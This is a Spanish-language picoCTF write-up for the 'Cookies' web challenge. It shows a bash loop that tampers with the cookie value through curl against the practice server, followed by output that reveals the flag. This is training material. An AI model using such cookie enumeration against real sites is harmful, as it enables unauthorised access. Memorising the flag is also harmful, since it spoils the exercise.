## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)

## Datos de Acceso al Nivel
user: carlosof
password:

## Solución 
- Iniciar un bucle, e iterar sobre los números del 0 al 20.
- Realizar una solicitud HTTP, usando curl para enviar una solicitud al servidor en http://mercury.picoctf.net:54219/check.
- Incluir una cookie en la solicitud con el nombre name y el valor del número actual del bucle ($i).
- Filtrar la salida: Pasar el resultado de curl a grep para buscar y mostrar solo las líneas que contienen "I love" o "pico".

```bash
carlosof-picoctf@webshell:~$ for i in {0..20}; do  curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep "I love\|pico"
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love oatmeal raisin cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love gingersnap cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love shortbread cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love peanut butter cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love whoopie pie cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love sugar cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love molasses cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love kiss cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love biscotti cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love butter cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love spritz cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love snowball cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love drop cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love thumbprint cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love pinwheel cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love wafer cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
            <p style="text-align:center; font-size:30px;"><b>I love macaroon cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love fortune cookies!</b></p>
```
## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/173